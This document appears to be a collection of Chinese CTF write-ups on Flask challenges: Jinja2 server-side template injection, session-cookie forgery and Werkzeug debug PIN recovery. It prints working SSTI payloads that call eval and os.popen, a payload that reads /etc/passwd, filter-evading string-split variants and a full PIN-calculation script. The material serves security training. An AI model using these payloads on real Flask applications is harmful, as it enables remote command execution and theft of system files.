# ssti
##  [NISACTF 2022]midlevel  
![e6cad88b314f899f3b2fe4efe0195fe0.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709560376063-4890d1e7-5963-47b5-b764-ea1f055b90a3.png#averageHue=%23fbfbfa&clientId=u834180e2-b7ec-4&from=paste&height=743&id=u1078e052&originHeight=929&originWidth=1634&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75854&status=done&style=none&taskId=u3fe8cdb1-e1b4-471c-8821-b597a431ae9&title=&width=1307.2)
打开题目发现右上角显示的真实ip
![f5be66cc82b7dfc95f0723cff978c66a.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709560476242-584381f4-1760-420f-8170-3cfd79dbbd24.png#averageHue=%23f8f6f6&clientId=u834180e2-b7ec-4&from=paste&height=154&id=uc81825c7&originHeight=193&originWidth=880&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90884&status=done&style=none&taskId=u77583828-514c-4100-9393-73c7ac77b55&title=&width=704)
当xff时有回显，然后if 语句命令执行，成功
![19172c9f582a312de37a5c0602d2934f.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709560716557-f6d739b5-ab8f-4314-b27e-c2089bd7ae9c.png#averageHue=%23edeceb&clientId=u834180e2-b7ec-4&from=paste&height=277&id=u76a0e1cc&originHeight=346&originWidth=1153&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35613&status=done&style=none&taskId=u47b23434-c79b-474e-9017-545b39fb7d2&title=&width=922.4)
![cd310f3be939a8513975dfecad303814.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709560800566-d94358ee-cb79-4525-8fbc-95b70e23f86a.png#averageHue=%23f9f8f8&clientId=u834180e2-b7ec-4&from=paste&height=267&id=uc4f6fadf&originHeight=334&originWidth=1133&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40447&status=done&style=none&taskId=u402bf51e-6710-47f7-875e-26d6c83895b&title=&width=906.4)
##  [HNCTF 2022 WEEK2]ez_SSTI  
![eabc50b0d2230a007702ffe218a845bf.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709561367577-bad4bbba-5ffd-413d-8891-c20f903b3c63.png#averageHue=%23d7b467&clientId=u9efd3fb2-1598-4&from=paste&height=227&id=ub61b8e1f&originHeight=284&originWidth=774&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21142&status=done&style=none&taskId=u74260f47-c98d-40a7-b37a-70f0f60e625&title=&width=619.2)
经典注入点
![20230226102815-3922049c-b57d-1.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709561861882-3d82233b-e94d-4392-a5f7-cc78f4303d5c.png#averageHue=%23fef2ee&clientId=u9efd3fb2-1598-4&from=paste&height=423&id=u82da5b60&originHeight=529&originWidth=1167&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=85029&status=done&style=none&taskId=u015cc4db-b3ae-4317-ba2f-35c6f30ae58&title=&width=933.6)
![89886c1c3ce5e5ac2afbc76a8bab000d.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709561851277-4f91cc3d-d381-4979-a77b-75719263ce85.png#averageHue=%23f4f3f3&clientId=u9efd3fb2-1598-4&from=paste&height=158&id=ube560da1&originHeight=198&originWidth=1201&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27463&status=done&style=none&taskId=u22f95930-411a-4e42-a4d1-16942e1dc8f&title=&width=960.8)
![4fbc87a633d40cba844ad3752b458d7c.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709561887540-d8022d7a-dcee-4a68-a6ac-9bcb858ff326.png#averageHue=%23f5f4f3&clientId=u9efd3fb2-1598-4&from=paste&height=150&id=ue29eed16&originHeight=188&originWidth=1220&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24157&status=done&style=none&taskId=u603e7b30-ad41-4383-a779-c853e194462&title=&width=976)
![b01282a3f76580ecae46f0e5623fcf8e.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709561920413-c5e70400-fbe7-4d9a-a5be-300924ba40f8.png#averageHue=%23f5f4f4&clientId=u9efd3fb2-1598-4&from=paste&height=154&id=ua109cbe7&originHeight=192&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23856&status=done&style=none&taskId=ufb6c5e67-cc61-47a9-93ef-9431e4208e0&title=&width=1000)
所以大概是jinjia2
payload：?name={{"".__class__.__base__.__subclasses__()
}}
![d5658446f73c0a1213f30d9cef2c4f68.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709562138823-05dd4558-ee34-4d35-a730-fc6e05b5c090.png#averageHue=%23cea56f&clientId=u9efd3fb2-1598-4&from=paste&height=84&id=ufad265eb&originHeight=105&originWidth=371&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12216&status=done&style=none&taskId=u5f084177-ebd7-463b-ab8f-5bcdc6304aa&title=&width=296.8)	
找到getshell类：subprocess.Popen、site._Printer、_sitebuiltins._Printer、os.system方法，或者os._wrap_close类，用>查询定位
模版注入：{{"".__class__.__mro__[-1].__subclasses__()[407].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("tac flag").read()')}}
![3aba4dc75884085d6bee87daab35c380.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709563060689-d5c358d0-68df-4d74-bc17-91bcc761653c.png#averageHue=%23f3f2f1&clientId=u9efd3fb2-1598-4&from=paste&height=190&id=u8e17db57&originHeight=238&originWidth=1910&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57887&status=done&style=none&taskId=u79d408b1-5f42-4bb9-ac76-f4f22551c4f&title=&width=1528)
## [Flask]SSTI
打开题目看到
![48c523dddd960c8f962fcdca2bcad40d.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709809217659-b3d9df01-c368-41f6-bc21-57d480118c01.png#averageHue=%23f9f9f8&clientId=u0d32116d-cbad-4&from=paste&height=85&id=u4f0c6912&originHeight=85&originWidth=266&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1327&status=done&style=none&taskId=ucc62d2db-edc4-490d-a4fd-55790e8c883&title=&width=266)
盲猜注入点是name
![7cf3aa482710167f6d68de483a7887ff.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709809247716-9eeac13a-b785-4582-bdd7-6644654dc1dc.png#averageHue=%23f5f5f5&clientId=u0d32116d-cbad-4&from=paste&height=205&id=u3e710541&originHeight=205&originWidth=849&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13819&status=done&style=none&taskId=u178266c7-0afe-47fe-aedc-5c2277089a1&title=&width=849)
成功后测试ssti模版类型
![cb8441c87698fa827eb0a399f9a3558b.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709809287797-79c8d897-cc17-4c9c-ad8e-bd55122fa676.png#averageHue=%23f5f5f4&clientId=u0d32116d-cbad-4&from=paste&height=179&id=u9726012e&originHeight=179&originWidth=863&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13416&status=done&style=none&taskId=ubfe012ac-e237-4812-bc4d-4f683cee572&title=&width=863)
jinjia2，打入模版
![b906103404c38d028258e75c246b35bd.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709814014405-8a4de3be-5ae3-4cdd-a44e-c49f15838dd9.png#averageHue=%23f7f7f6&clientId=u0d32116d-cbad-4&from=paste&height=185&id=u664d83f9&originHeight=185&originWidth=1609&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24415&status=done&style=none&taskId=u901c16d5-9070-40a0-a18b-a159516fd7c&title=&width=1609)
在源代码中可以看到子类
![d01bd5dfdb47eb131d57307161be8c19.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709815695244-5b8b39db-6911-4ed8-9db2-3c4b64a12704.png#averageHue=%23f5f4f2&clientId=u0d32116d-cbad-4&from=paste&height=359&id=ud811838e&originHeight=359&originWidth=1108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52622&status=done&style=none&taskId=ud25e1ebd-ba55-44ba-aa2d-9e9903d592e&title=&width=1108)
导入OS，成功命令执行，在环境变量找到flag
![b2374195f152c182442d429a11d25388.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709816173902-a3bdbba6-968d-486a-8e78-38340f755810.png#averageHue=%23f3f1f0&clientId=u0d32116d-cbad-4&from=paste&height=319&id=u85ba44fd&originHeight=319&originWidth=1765&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70389&status=done&style=none&taskId=u36f94309-d4c4-47b3-a518-e22b11ab8d9&title=&width=1765)
网上还有一种payload
```php
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("env").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

```
# flask session伪造
##  [NSSRound#13 Basic]flask?jwt?  
![1590f72aa4dc61da2cf076ec35c7433d.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709644717290-f6da3db4-e9ce-473b-af31-116c21ebff1e.png#averageHue=%23fefefd&clientId=u6dc11363-e49a-4&from=paste&height=617&id=u81ba2022&originHeight=617&originWidth=905&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15306&status=done&style=none&taskId=uf934da75-8666-4bea-9a91-ed6044fdc2b&title=&width=905)
没有账号密码无法登录，也无sql注入
打开忘记密码看到hint，猜测session伪造
![9c0610bf2ed32778690cdd4c49106b37.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709644761147-e8a10373-3c81-4c42-96bd-0393ce44a3de.png#averageHue=%23fefdfd&clientId=u6dc11363-e49a-4&from=paste&height=762&id=u9462ff7b&originHeight=762&originWidth=2249&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76927&status=done&style=none&taskId=u9b3cb1a5-416e-4fe1-94fc-d6ad5df62ba&title=&width=2249)
注册账号进入后看到拿flag，但拿不了
![0df65ab4196cbc14ac003fec2140fb2b.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709645051171-b12335ee-12f2-4b60-94fc-4cfcc4ad3bb1.png#averageHue=%23f5f3f2&clientId=u6dc11363-e49a-4&from=paste&height=56&id=u716e1e55&originHeight=56&originWidth=242&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1185&status=done&style=none&taskId=u8b62047a-bbaf-4c7e-bab6-70761814b8e&title=&width=242)
看cookie，用flask-session-cookie-manager-master解密得到
![385daa9ffc6293b63d18a9dd76b06f08.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709645194775-d97b05f0-30c5-4cf9-b029-2e71e6f135bd.png#averageHue=%231b1b1b&clientId=u6dc11363-e49a-4&from=paste&height=124&id=ubeed69d4&originHeight=124&originWidth=1093&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24741&status=done&style=none&taskId=uc2ceb424-ebde-4537-8195-0df34c6597a&title=&width=1093)
猜测admin的id是1，构造session
![2ecfaac3108070c82470776f2b15c7ea.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709645244643-150eee31-54b5-4fbc-a6c4-bef10f6c55a8.png#averageHue=%23222222&clientId=u6dc11363-e49a-4&from=paste&height=125&id=uf85d77db&originHeight=125&originWidth=1098&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27471&status=done&style=none&taskId=u2b5d236d-6e2d-430e-bbaf-5f3bb24916d&title=&width=1098)
重新发包得到flag
![84cc2f4acef6767e5832f0bfc50dd910.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709645269647-952b42b9-98a5-4f1d-a580-34c4c3815d41.png#averageHue=%23f7f3f3&clientId=u6dc11363-e49a-4&from=paste&height=301&id=u379d26a9&originHeight=301&originWidth=940&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46518&status=done&style=none&taskId=u6daca066-b120-4e6f-b84e-bc7ebaaee36&title=&width=940)
# debug模式开启后的利用
## [GYCTF2020]FlaskApp
是个base64的加解密程序，源码中找到hint
![c533af0845a32412cc079c81f00ca9f1.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709817486507-2cc9c2ec-05bf-4308-a08b-7a63f9dccbbb.png#averageHue=%23e9e8e5&clientId=u0d32116d-cbad-4&from=paste&height=37&id=ua76a458e&originHeight=37&originWidth=129&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1587&status=done&style=none&taskId=u07f5db26-5a49-4e59-b768-bb5fb2d129f&title=&width=129)
解密处如果输入不正确会有Flask debug
![1bca9778aeae7a84d1e8ec325b2575e1.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709817536339-0d7268ac-e0ba-4911-840a-7de4979ee339.png#averageHue=%23fbfaf9&clientId=u0d32116d-cbad-4&from=paste&height=546&id=uf3183cf5&originHeight=546&originWidth=739&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35924&status=done&style=none&taskId=ua956de75-a66d-4310-9d98-2a9955a7a6f&title=&width=739)
找到可以打开的报错
![7596e10b1a2cb85557219763a2fb2038.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709817597892-452109a7-53ad-417b-a3a1-23def1812d21.png#averageHue=%23d1aa6b&clientId=u0d32116d-cbad-4&from=paste&height=68&id=ua50a23ce&originHeight=68&originWidth=508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3537&status=done&style=none&taskId=uf4879a23-7f91-43b8-befe-b0e41d68e41&title=&width=508)
![7e48bc047657c4b18d2714b2445056a7.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709817619472-fae0cf95-b8b6-41fc-aec9-6d3b5ffd85b1.png#averageHue=%23faf9f7&clientId=u0d32116d-cbad-4&from=paste&height=279&id=udaaf2074&originHeight=279&originWidth=547&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11957&status=done&style=none&taskId=u54b01516-3195-4fda-8d8a-a8897d07add&title=&width=547)
```php
File "/app/app.py", line 53, in decode
 
@app.route('/decode',methods=['POST','GET'])
def decode():
    if request.values.get('text') :
        text = request.values.get("text")
        text_decode = base64.b64decode(text.encode())
        tmp = "结果 ： {0}".format(text_decode.decode())
        if waf(tmp) :			//waf是可以读源码得到的
            flash("no no no !!")
            return redirect(url_for('decode'))
        res =  render_template_string(tmp)

```
通过ssti注入查用户名
```php
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() }}{% endif %}{% endfor %}
```
用户名：flaskweb
![bbd2551466bfb84c7337d7b491019af9.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709820450054-07b3d335-dc69-4913-b199-84191739f62e.png#averageHue=%23f4f1e8&clientId=u0d32116d-cbad-4&from=paste&height=659&id=uf1bd23ba&originHeight=659&originWidth=761&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63997&status=done&style=none&taskId=u301f370a-afab-44ee-a014-675b5a150d5&title=&width=761)
modname一般为固定值flask.app ，getattr(app, '__name__', getattr(app.__class__, '__name__'))一般为固定值Flask，flask库下app.py的绝对路径/usr/local/lib/python3.7/site-packages/flask/app.py
读文件/sys/class/net/eth0/address查mac地址
![9677efe11e528c987adbe9fedc61bd9a.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709820937884-c2d9f6f6-855f-4902-83a8-0221c2fcfa56.png#averageHue=%23faf7ec&clientId=u0d32116d-cbad-4&from=paste&height=103&id=u9799eefd&originHeight=103&originWidth=647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5135&status=done&style=none&taskId=u9f648dac-dd3a-4ad3-ba44-c5cc8449da2&title=&width=647)
要16转10进制
linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，而docker的id在/proc/self/cgroup，所以像上面那样改一下payload就能用
![fa1ceb04b8f2c79d071bc818f5972079.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709821047393-9892c21b-01d4-47ba-bd89-64971825184f.png#averageHue=%23f5f2e6&clientId=u0d32116d-cbad-4&from=paste&height=88&id=u6f5c1ffb&originHeight=88&originWidth=721&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6797&status=done&style=none&taskId=u472791dd-f0b3-4dd7-a96e-455117dd742&title=&width=721)
脚本计算PIN码
```php
#MD5
import hashlib
from itertools import chain
probably_public_bits = [
     'flaskweb'# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
 
private_bits = [
     '59557903926488',# str(uuid.getnode()),  /sys/class/net/ens33/address
     '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
]
 
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
 
cookie_name = '__wzd' + h.hexdigest()[:20]
 
num = None
if num is None:
   h.update(b'pinsalt')
   num = ('%09d' % int(h.hexdigest(), 16))[:9]
 
rv =None
if rv is None:
   for group_size in 5, 4, 3:
       if len(num) % group_size == 0:
          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                      for x in range(0, len(num), group_size))
          break
       else:
          rv = num
 
print(rv)
```
![dc8f8765f5a905e2b57a2200ba0c58d2.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709821220351-94467468-8503-45a8-9bdb-8b3aa7527e1e.png#averageHue=%231e1d1b&clientId=u0d32116d-cbad-4&from=paste&height=49&id=u8fc2dd11&originHeight=49&originWidth=450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3506&status=done&style=none&taskId=uba0b0c4f-3d4c-459d-9c9b-842593fb062&title=&width=450)
获得shell
import os
os.popen('ls /').read()
![ec5be84b667eb44a8b7455d1f764118e.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709821411452-6e17a947-327e-45e6-885a-66b03b5df8b1.png#averageHue=%23fafafa&clientId=u0d32116d-cbad-4&from=paste&height=63&id=uf2f81191&originHeight=63&originWidth=1063&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9427&status=done&style=none&taskId=u9db0889d-218a-4597-aae9-0370ebb8533&title=&width=1063)
其他方法
```php
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.__globals__.values() %}
{% if b.__class__ == {}.__class__ %}
{% if 'eva'+'l' in b.keys() %}
{{ b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("cat /this_is_the_fl'+'ag.txt").read()') }}
{% endif %}
{% endif %}
{% endfor %}
{% endif %}
{% endfor %}

```
